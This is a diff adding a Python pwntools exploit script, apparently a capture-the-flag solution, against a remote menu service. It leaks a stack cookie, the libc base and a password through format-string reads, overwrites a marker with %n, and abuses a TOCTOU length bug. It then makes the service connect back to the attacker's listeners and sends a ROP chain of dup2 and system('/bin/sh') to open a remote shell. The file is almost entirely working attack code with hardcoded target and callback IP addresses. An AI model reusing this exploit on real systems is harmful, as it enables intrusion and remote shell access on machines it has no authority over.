@@ -1,0 +1,181 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+import socket
+import re
+import binascii
+import time
+
+def p32(addr):
+	return struct.pack('<L', addr)
+def p64(addr):
+	return struct.pack('<Q', addr)
+def i32(data):
+	return int(struct.unpack('<I', data)[0])
+def libc(offset):
+	return struct.pack('<I', libc_base + offset)
+def flat(data):
+	return ''.join(data)
+
+def next_stage(msg=""):
+	global stage
+	stage += 1
+	log.info(">> stage {0} {1}".format(stage, msg))
+
+def wait_stage(num, msg=""):
+	global stage
+	next_stage(msg)
+	while stage < num:
+		time.sleep(1)
+
+def create_listener(port, tid):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	s.bind(('0.0.0.0', port))
+	s.listen(5)
+	ss = s.accept()[0]
+	print "got connection {}".format(tid)
+	ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	return remote.fromsocket(ss)
+
+def tpwn1(port):
+	global stage
+	tid = "1"
+
+	c = create_listener(port, tid)
+	wait_stage(2, "wait for thread 2 to connect")
+	print c.readuntil('>')
+	c.sendline('3')
+	print c.readuntil(':')
+	c.sendline('400')
+	log.info("overwrote ...")
+	next_stage()
+	time.sleep(60)
+
+def tpwn2(port):
+	global stage
+	tid = "2"
+
+	c = create_listener(port, tid)
+	print c.readuntil('>')
+
+	# send feedback
+	c.sendline('3')
+	print c.readuntil(':')
+	c.sendline('10')
+	wait_stage(3)
+	time.sleep(5)
+	print c.readuntil(':')
+
+	# enter fake data and ask to edit to abuse the TOCTOU of len
+	c.sendline('1337')
+	print c.readuntil(':')
+	c.sendline('y')
+	print c.readuntil(':')
+
+	# lazy rop, cover multiple fds, whatevs
+	payload = flat([
+		p32(cookie) * 17,
+		libc(nop_gadget) * 0x8,
+		libc(dup2_offset),
+		libc(pop_pop_gadget),
+		p32(4),
+		p32(0),
+		libc(dup2_offset),
+		libc(pop_pop_gadget),
+		p32(4),
+		p32(1),
+		libc(dup2_offset),
+		libc(pop_pop_gadget),
+		p32(5),
+		p32(0),
+		libc(dup2_offset),
+		libc(pop_pop_gadget),
+		p32(5),
+		p32(1),
+		libc(system_offset),
+		p32(0xdeadbeef),
+		libc(binsh_offset),
+		])
+	
+	c.sendline(payload)
+	c.interactive()
+
+def pwn(chall_ip, local_ip, magic=False):
+	global r
+	global libc_base
+	global cookie
+
+	Thread(target=tpwn1, args=(9991,)).start()
+	Thread(target=tpwn2, args=(9992,)).start()
+	r = remote(chall_ip, 31337)
+	
+	#pwnlib.ui.pause()
+	# leak cookie
+	r.readuntil(':')
+	r.sendline("%15$p")
+	r.readuntil(':')
+	cookie = int(r.read(11), 0)
+
+	# leak libc
+	r.readuntil(':')
+	r.sendline("%8$p.")
+	r.readuntil(':')
+	libc_base = int(r.read(11), 0) - libc_offset
+	log.success("Leaked libc: {}".format(hex(libc_base)))
+
+	# leak password
+	r.readuntil(':')
+	r.sendline("%7$s")
+	r.readuntil(':')
+	pw = r.read(12).strip()
+
+	# overwrite trial marker
+	r.sendline("AAAA%6$n")
+	r.readuntil(':')
+	r.readuntil(':')
+	r.sendline(pw)
+	
+	log.success("pw: {0}\nlibc: {1}\ncookie:{2}\n".format(pw, hex(libc_base), hex(cookie)))
+	print r.readuntil('>')
+
+	time.sleep(5)
+	# send invites
+	r.sendline('2')
+	r.readuntil(':')
+	r.sendline(local_ip)
+	r.readuntil(':')
+	r.sendline('9991')
+	r.readuntil('>')
+
+	r.sendline('2')
+	r.readuntil(':')
+	r.sendline(local_ip)
+	r.readuntil(':')
+	r.sendline('9992')
+	r.readuntil('>')
+	pwnlib.ui.pause()
+
+
+context(arch='i386', bits=32, os='linux')
+
+stage = 0
+libc_base = 0
+cookie = 0
+
+#nop_gadget = 0x0002406e
+#pop_pop_gadget = 0x000f3b6b
+nop_gadget = 0x00023f97
+pop_pop_gadget = 0x000f1cba
+libc_offset = 0x5d817
+r = None
+
+libc_bin = ELF('./libc.so')
+
+fopen_offset = libc_bin.symbols['_IO_fopen']
+dup2_offset = libc_bin.symbols['dup2']
+system_offset = libc_bin.symbols['system']
+binsh_offset = next(libc_bin.search('/bin/sh'))
+
+pwn(chall_ip='52.30.206.11', local_ip='46.101.44.138')
